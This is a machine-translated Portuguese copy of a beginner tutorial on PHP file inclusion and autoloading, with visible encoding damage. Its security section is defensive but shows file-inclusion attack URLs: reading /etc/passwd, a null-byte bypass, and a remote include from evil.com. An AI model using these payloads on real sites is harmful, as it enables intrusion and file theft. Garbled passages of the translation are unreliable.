<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üöö üññüèø üé∞ PHP para iniciantes. Conex√£o de arquivo ü§ôüèΩ ‚åõÔ∏è üöí</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Na continua√ß√£o da s√©rie PHP para iniciantes, o artigo de hoje se concentrar√° em como o PHP pesquisa e conecta arquivos. 

 Porque e porque 
 O PHP √© u...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PHP para iniciantes. Conex√£o de arquivo</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439618/"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7f2/13e/83b/7f213e83b178b352cfdda06ff16a639f.png" alt="imagem"></div><br><br>  Na continua√ß√£o da s√©rie PHP para iniciantes, o artigo de hoje se concentrar√° em como o PHP pesquisa e conecta arquivos. <br><a name="habracut"></a><br><h3>  Porque e porque </h3><br>  O PHP √© uma linguagem de script criada inicialmente para esculpir rapidamente as p√°ginas iniciais (sim, sim, originalmente era Ferramentas Pessoais de Idade Pessoal) e, mais tarde, come√ßou a criar lojas, programas sociais e outros artesanatos que v√£o al√©m do que se pretendia. , mas por que eu estou - e, quanto mais funcionalidade √© codificada, maior √© o desejo de estrutur√°-la corretamente, livrar-se da duplica√ß√£o de c√≥digo, dividi-la em partes l√≥gicas e conectar-se apenas se necess√°rio (esse √© o mesmo sentimento que voc√™ teve quando voc√™ leu antes  posi√ß√£o, poderia ser quebrado em peda√ßos separados).  Para esse prop√≥sito, o PHP tem v√°rias fun√ß√µes, cujo significado geral √© conectar e interpretar o arquivo especificado.  Vejamos um exemplo de conex√£o de arquivos: <br><br><pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// file variable.php $a = 0; // file increment.php $a++; // file index.php include ('variable.php'); include ('increment.php'); include ('increment.php'); echo $a;</span></span></code> </pre> <br>  Se voc√™ executar o script <em>index.php</em> , o PHP conectar√° e executar√° tudo isso em sequ√™ncia: <br><br><pre> <code class="php hljs">$a = <span class="hljs-number"><span class="hljs-number">0</span></span>; $a++; $a++; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br>  Quando um arquivo √© conectado, seu c√≥digo est√° no mesmo escopo da linha em que foi conectado, portanto, todas as vari√°veis ‚Äã‚Äãdispon√≠veis nessa linha estar√£o dispon√≠veis no arquivo inclu√≠do.  Se classes ou fun√ß√µes foram declaradas no arquivo de inclus√£o, elas se enquadram no escopo global (a menos que, √© claro, um espa√ßo para nome tenha sido especificado para elas). <br><br>  Se voc√™ conectar o arquivo dentro da fun√ß√£o, os arquivos inclu√≠dos ter√£o acesso ao escopo da fun√ß√£o, portanto o c√≥digo a seguir tamb√©m funcionar√°: <br><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $a = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; } a(); <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br><blockquote>  Separadamente, observo as <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">constantes m√°gicas</a> : <code>__DIR__</code> , <code>__FILE__</code> , <code>__LINE__</code> e outras - elas est√£o vinculadas ao contexto e s√£o executadas antes da inclus√£o ocorrer </blockquote>  A peculiaridade de conectar arquivos √© que, ao conectar um arquivo, a an√°lise muda para o modo HTML; por esse motivo, qualquer c√≥digo dentro do arquivo inclu√≠do deve estar entre tags PHP: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//   // ... // </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre><br>  Se voc√™ tiver apenas c√≥digo PHP no arquivo, √© costume omitir a tag de fechamento, para n√£o esquecer acidentalmente qualquer encadeamento de caracteres ap√≥s a tag de fechamento, o que est√° repleto de problemas (discutirei isso no pr√≥ximo artigo). <br><blockquote>  Voc√™ viu um arquivo de site com 10.000 linhas?  J√° l√°grimas nos meus olhos (‚ï•_‚ï•) ... </blockquote><h3>  Recursos de conex√£o de arquivo </h3><br>  Como mencionado acima, no PHP existem v√°rias fun√ß√µes para conectar arquivos: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">incluir</a> - inclui e executa o arquivo especificado, se n√£o o encontrar - emite um alerta <code>E_WARNING</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">include_once</a> - semelhante √† fun√ß√£o acima, mas inclui o arquivo uma vez </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">exigir</a> - inclui e executa o arquivo especificado, se n√£o o encontrar - gera um erro fatal <code>E_ERROR</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">require_once</a> - semelhante √† fun√ß√£o acima, mas inclui o arquivo uma vez </li></ul><br><blockquote>  Na realidade, essas n√£o s√£o exatamente fun√ß√µes, s√£o constru√ß√µes especiais de linguagem e par√™nteses podem ser omitidos.  Entre outras coisas, existem outras maneiras de conectar e executar arquivos, mas cave voc√™ mesmo, que seja uma "tarefa com um asterisco" para voc√™;) </blockquote>  Vamos dar um exemplo das diferen√ßas entre <code>require</code> e <code>require_once</code> , pegue um arquivo <em>echo.php</em> : <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  E vamos conect√°-lo v√°rias vezes: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//     //  1 require_once 'echo.php'; //    , ..   //  true require_once 'echo.php'; //     //  1 require 'echo.php';</span></span></code> </pre><br>  O resultado da execu√ß√£o ser√£o duas conex√µes com o arquivo <em>echo.php</em> : <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Existem algumas diretivas que afetam a conex√£o, mas voc√™ n√£o precisar√° delas - <a href="">auto_prepend_file</a> e <a href="">auto_append_file</a> .  Essas diretivas permitem instalar arquivos que ser√£o conectados antes de todos os arquivos serem conectados e ap√≥s a execu√ß√£o de todos os scripts, respectivamente.  N√£o consigo nem imaginar um cen√°rio "ao vivo" quando necess√°rio. <br><br><div class="spoiler">  <b class="spoiler_title">Tarefa</b> <div class="spoiler_text">  Voc√™ pode criar e implementar um script para usar as <code>auto_prepend_file</code> e <code>auto_append_file</code> ; voc√™ s√≥ pode alter√°-las no <em>php.ini</em> , <em>.htaccess</em> ou <em>httpd.conf</em> (consulte <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PHP_INI_PERDIR</a> ) :) <br></div></div><br><h3>  Para onde est√° olhando? </h3><br>  O PHP procura arquivos de inclus√£o nos diret√≥rios especificados na diretiva <a href="">include_path</a> .  Essa diretiva tamb√©m afeta a opera√ß√£o de <code>fopen()</code> , <code>file()</code> , <code>readfile()</code> e <code>file_get_contents()</code> .  O algoritmo √© bastante simples - ao pesquisar por arquivos, o PHP revisa cada diret√≥rio a partir de <code>include_path</code> , at√© encontrar um arquivo para conectar, caso contr√°rio, retorna um erro.  Para alterar o <code>include_path</code> de um script, use a fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">set_include_path ()</a> . <br><br>  H√° uma coisa importante a considerar ao configurar <code>include_path</code> - caracteres diferentes s√£o usados ‚Äã‚Äãcomo separador de caminho no Windows e Linux - ";"  e ":" respectivamente, portanto, ao especificar seu diret√≥rio, use a constante <code>PATH_SEPARATOR</code> , por exemplo: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//    linux $path = '/home/dev/library'; //    windows $path = 'c:\Users\Dev\Library'; //  linux  windows   include_path  set_include_path(get_include_path() . PATH_SEPARATOR . $path);</span></span></code> </pre><br>  Ao escrever <code>include_path</code> em um arquivo ini, voc√™ pode usar vari√°veis ‚Äã‚Äãde ambiente como <code>${USER}</code> : <br><br> <code>include_path = ".:${USER}/my-php-library" <br></code> <br><br>  Se voc√™ incluir um caminho absoluto (come√ßando com "/") ou relativo (come√ßando com "." Ou "..") ao conectar o arquivo, a diretiva <code>include_path</code> ser√° ignorada e a pesquisa ser√° realizada apenas no caminho especificado. <br><blockquote>  Talvez valha a pena falar sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">safe_mode</a> , mas isso tem sido uma hist√≥ria (desde a vers√£o 5.4), e espero que voc√™ n√£o a encontre, mas de repente, para saber o que era, mas passou ... </blockquote><h3>  Usando retorno </h3><br>  Vou falar sobre um pequeno truque de vida - se o arquivo inclu√≠do retornar algo usando a constru√ß√£o de <code>return</code> , esses dados poder√£o ser obtidos e usados, para que voc√™ possa organizar facilmente a conex√£o dos arquivos de configura√ß√£o, darei um exemplo para ilustrar: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'user'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-string"><span class="hljs-string">'pass'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">''</span></span> ];</code> </pre><br><pre> <code class="php hljs">$dbConfig = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'config/db.php'</span></span>; var_dump($dbConfig); <span class="hljs-comment"><span class="hljs-comment">/* array( 'host' =&gt; 'localhost', 'user' =&gt; 'root', 'pass' =&gt; '' ) */</span></span></code> </pre><br><blockquote>  Fatos interessantes, sem os quais tamb√©m foi bom: se as fun√ß√µes forem definidas no arquivo inclu√≠do, elas poder√£o ser usadas no arquivo principal, independentemente de terem sido declaradas antes ou depois do retorno </blockquote><div class="spoiler">  <b class="spoiler_title">Tarefa</b> <div class="spoiler_text">  Escreva o c√≥digo que coletar√° a configura√ß√£o de v√°rias pastas e arquivos.  A estrutura do arquivo √© a seguinte: <br><br><pre> <code class="plaintext hljs">config |-- default | |-- db.php | |-- debug.php | |-- language.php | `-- template.php |-- development | `-- db.php `-- production |-- db.php `-- language.php</code> </pre><br>  Nesse caso, o c√≥digo deve funcionar da seguinte maneira: <br><br><ul><li>  se houver uma vari√°vel <code>PROJECT_PHP_SERVER</code> no ambiente do sistema e for igual ao <code>development</code> , todos os arquivos da pasta <em>padr√£o</em> dever√£o ser conectados, os dados dever√£o ser inclu√≠dos na vari√°vel <code>$config</code> , os arquivos da pasta de <em>desenvolvimento</em> dever√£o ser conectados e os dados recebidos dever√£o moer os itens correspondentes armazenados em <code>$config</code> </li><li>  comportamento semelhante se <code>PROJECT_PHP_SERVER</code> for <code>production</code> (naturalmente apenas para a pasta de <em>produ√ß√£o</em> ) </li><li>  se n√£o houver vari√°vel ou estiver definido incorretamente, apenas os arquivos da pasta <em>padr√£o</em> ser√£o conectados </li></ul><br></div></div><br><h3>  Conex√£o autom√°tica </h3><br>  As constru√ß√µes com anexos de arquivo parecem muito volumosas e tamb√©m seguem a atualiza√ß√£o - outro presente, confira um trecho de c√≥digo do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">artigo de</a> exemplo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">sobre exce√ß√µes</a> : <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// load all files w/out autoloader require_once 'Education/Command/AbstractCommand.php'; require_once 'Education/CommandManager.php'; require_once 'Education/Exception/EducationException.php'; require_once 'Education/Exception/CommandManagerException.php'; require_once 'Education/Exception/IllegalCommandException.php'; require_once 'Education/RequestHelper.php'; require_once 'Education/Front.php';</span></span></code> </pre><br>  A primeira tentativa de evitar essa "felicidade" foi o aparecimento da fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">__autoload</a> .  Mais precisamente, nem era uma fun√ß√£o espec√≠fica, voc√™ tinha que definir essa fun√ß√£o e, com ela, precisava conectar os arquivos que precis√°vamos pelo nome da classe.  A √∫nica regra era que, <strong>para cada classe, um arquivo separado fosse criado pelo nome da classe</strong> (ou seja, <i>myClass</i> deveria estar dentro do arquivo <i>myClass.php</i> ).  Aqui est√° um exemplo da implementa√ß√£o dessa fun√ß√£o <code>__autoload()</code> (extra√≠da de coment√°rios no manual oficial): <br><br>  A classe que iremos conectar: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//  myClass    myClass.php class myClass { public function __construct() { echo "myClass init'ed successfuly!!!"; } }</span></span></code> </pre><br>  O arquivo que conecta esta classe: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function __autoload($classname) { $filename = $classname .".php"; include_once $filename; } //   $obj = new myClass();</span></span></code> </pre><br>  Agora, sobre os problemas com essa fun√ß√£o - imagine uma situa√ß√£o em que voc√™ esteja conectando c√≥digo de terceiros, e a√≠ algu√©m j√° registrou a fun√ß√£o <code>__autoload()</code> para o seu c√≥digo e pronto: <br><br><pre> <code class="php hljs">Fatal error: Cannot redeclare __autoload()</code> </pre><br>  Para evitar isso, criamos uma fun√ß√£o que permite registrar uma fun√ß√£o ou m√©todo arbitr√°rio como um carregador de classes - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">spl_autoload_register</a> .  I.e.  podemos criar v√°rias fun√ß√µes com um nome arbitr√°rio para carregar classes e registr√°-las usando <code>spl_autoload_register</code> .  Agora, o <code>index.php</code> ficar√° assim: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function myAutoload($classname) { $filename = $classname .".php"; include_once($filename); } //   spl_autoload_register('myAutoload'); //   $obj = new myClass();</span></span></code> </pre><br><blockquote>  O cabe√ßalho ‚Äúvoc√™ sabia?‚Äù: O primeiro par√¢metro <code>spl_autoload_register()</code> √© opcional e, chamando a fun√ß√£o sem ela, a fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">spl_autoload</a> ser√° usada como carregador, a pesquisa ser√° realizada em pastas de <code>include_path</code> e arquivos com a extens√£o <code>.php</code> e <code>.inc</code> , mas isso a lista pode ser expandida usando a fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">spl_autoload_extensions</a> </blockquote>  Agora, cada desenvolvedor pode registrar seu carregador, o principal √© que os nomes das classes n√£o coincidem, mas isso n√£o deve ser um problema se voc√™ usar espa√ßos para nome. <br><blockquote>  Como uma funcionalidade avan√ßada como <code>spl_autoload_register()</code> existe h√° muito tempo, a fun√ß√£o <code>spl_autoload_register()</code> j√° est√° declarada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">obsoleta no PHP 7.1</a> , o que significa que, no futuro pr√≥ximo, essa fun√ß√£o ser√° completamente removida (X_x) </blockquote>  Bem, a imagem ficou mais ou menos esclarecida, embora, ei, todos os gerenciadores de inicializa√ß√£o registrados estejam na fila da mesma forma que s√£o registrados, respectivamente, se algu√©m o enganou em seu gerenciador de inicializa√ß√£o, em vez do resultado esperado, um erro muito desagrad√°vel ser√° solucionado.  Para evitar isso, os adultos espertos descreveram um padr√£o que permite conectar bibliotecas de terceiros sem problemas, o principal √© que a organiza√ß√£o das classes neles est√° em conformidade com o padr√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PSR-0</a> (j√° tem 10 anos) ou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PSR-4</a> .  Qual √© a ess√™ncia dos requisitos descritos nas normas: <br><br><ol><li>  Cada biblioteca deve viver em seu pr√≥prio espa√ßo para nome (o chamado espa√ßo para nome do fornecedor) </li><li>  Cada espa√ßo para nome deve ter sua pr√≥pria pasta. </li><li>  Dentro do espa√ßo para nome, pode haver subespa√ßos - tamb√©m em pastas separadas </li><li>  Uma classe - um arquivo </li><li>  O nome do arquivo com a extens√£o <code>.php</code> deve corresponder exatamente ao nome da classe </li></ol><br>  Exemplo do manual: <br><table><tbody><tr><th>  Nome completo da turma </th><th>  Namespace </th><th>  Diret√≥rio base </th><th>  Caminho completo </th></tr></tbody><tbody><tr><td>  \ Acme \ Log \ Writer \ File_Writer </td><td>  Acme \ Log \ Writer </td><td>  ./acme-log-writer/lib/ </td><td>  ./acme-log-writer/lib/File_Writer.php </td></tr><tr><td>  \ Aura \ Web \ Response \ Status </td><td>  Aura \ Web </td><td>  / caminho / para / aura-web / src / </td><td>  /path/to/aura-web/src/Response/Status.php </td></tr><tr><td>  \ Symfony \ Core \ Request </td><td>  Symfony \ core </td><td>  ./vendor/Symfony/Core/ </td><td>  ./vendor/Symfony/Core/Request.php </td></tr><tr><td>  \ Zend \ Acl </td><td>  Zend </td><td>  / usr / includes / Zend / </td><td>  /usr/includes/Zend/Acl.php </td></tr></tbody></table><br><br>  As diferen√ßas entre esses dois padr√µes s√£o que o PSR-0 suporta c√≥digo antigo sem um namespace (ou seja, anterior √† vers√£o 5.3.0), e o PSR-4 est√° livre desse anacronismo e at√© evita o aninhamento desnecess√°rio de pastas. <br><br>  Gra√ßas a esses padr√µes, tornou-se poss√≠vel o surgimento de uma ferramenta como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">compositor</a> - um gerenciador de pacotes universal para PHP.  Se algu√©m errou, h√° um bom relat√≥rio da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">pronskiy</a> sobre essa ferramenta. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/cpdJR0D8ZV8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h3>  Inje√ß√£o de php </h3><br>  Eu tamb√©m queria falar sobre o primeiro erro de todo mundo que cria um √∫nico ponto de entrada para o site em um <code>index.php</code> e o chama de framework MVC: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!is_file($page)) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page;</code> </pre><br>  Voc√™ olha o c√≥digo e deseja apenas transferir algo malicioso para l√°: <br><br><pre> <code class="bash hljs">//     http://domain.com/index.php?page=../index.php //      http://domain.com/index.php?page=config.ini //    http://domain.com/index.php?page=/etc/passwd //  ,       http://domain.com/index.php?page=user/backdoor.php</code> </pre><br>  A primeira coisa que vem √† mente √© adicionar com for√ßa a extens√£o <code>.php</code> , mas em alguns casos ela pode ser contornada "gra√ßas a" uma <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">vulnerabilidade de zero byte</a> (leia esta vulnerabilidade <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">foi corrigida</a> por um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">longo tempo</a> , mas de repente voc√™ encontra um int√©rprete anterior ao PHP 5.3, bem, por desenvolvimento geral tamb√©m recomendam): <br><br><pre> <code class="bash hljs">//    http://domain.com/index.php?page=/etc/passwd%00</code> </pre><br><blockquote>  Nas vers√µes modernas do PHP, a presen√ßa de um caractere de byte zero no caminho do arquivo conectado imediatamente leva ao erro de conex√£o correspondente e, mesmo que o arquivo especificado exista e possa ser conectado, o resultado sempre ser√° um erro, ele √© verificado da seguinte maneira <code>strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)</code> (isto √© das entranhas do pr√≥prio PHP) </blockquote>  O segundo pensamento "que vale a pena" √© procurar um arquivo no diret√≥rio atual: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos(realpath($page), <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>) !== <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong path to file'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br>  A terceira, mas n√£o a √∫ltima modifica√ß√£o da verifica√ß√£o √© o uso da diretiva <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">open_basedir</a> , com sua ajuda, voc√™ pode especificar o diret√≥rio em que exatamente o PHP procurar√° arquivos para conectar: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); ini_set(<span class="hljs-string"><span class="hljs-string">'open_basedir'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br><blockquote>  Tenha cuidado, esta diretiva afeta n√£o apenas a conex√£o de arquivos, mas tamb√©m todos funcionam com o sistema de arquivos, ou seja,  incluindo essa restri√ß√£o, voc√™ deve ter esquecido nada fora do diret√≥rio especificado, nem os dados armazenados em cache nem os arquivos do usu√°rio (embora as fun√ß√µes <code>is_uploaded_file()</code> e <code>move_uploaded_file()</code> continuem funcionando com uma pasta tempor√°ria para os arquivos baixados). </blockquote>  Que outras verifica√ß√µes s√£o poss√≠veis?  Muitas op√ß√µes, tudo depende da arquitetura do seu aplicativo. <br><br>  Eu tamb√©m queria lembrar a exist√™ncia de uma diretiva "maravilhosa" <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">allow_url_include</a> (depende de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">allow_url_fopen</a> ), que permite conectar e executar arquivos PHP remotos, o que √© muito mais perigoso para o seu servidor: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   PHP  http://domain.com/index.php?page=http://evil.com/index.php</span></span></code> </pre><br>  Vi, lembre-se e nunca use, o benef√≠cio √© desativado por padr√£o.  Voc√™ precisar√° desse recurso um pouco menos do que nunca; em todos os outros casos, estabele√ßa a arquitetura correta do aplicativo, onde v√°rias partes do aplicativo se comunicam por meio da API. <br><br><div class="spoiler">  <b class="spoiler_title">Tarefa</b> <div class="spoiler_text">  Escreva um script que permita conectar scripts php da pasta atual por nome, lembrando-se de poss√≠veis vulnerabilidades e evitando erros. <br></div></div><br><h3>  Em conclus√£o </h3><br>  Este artigo √© a base do PHP, portanto, estude cuidadosamente, conclua tarefas e n√£o arquive, ningu√©m ensinar√° para voc√™. <br><br><h3>  PS </h3><br>  Este √© um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">repost</a> de uma s√©rie de artigos "PHP para iniciantes": <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">A sess√£o</a> </li><li>  <b>Conex√£o de arquivo</b> </li></ul><br>  Se voc√™ tiver coment√°rios sobre o material do artigo, ou possivelmente em forma, descreva a ess√™ncia dos coment√°rios, e tornaremos esse material ainda melhor. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt439618/">https://habr.com/ru/post/pt439618/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt439608/index.html">Religi√£o moderna: o que as pessoas d√£o ao Google, Facebook, Amazon e Apple?</a></li>
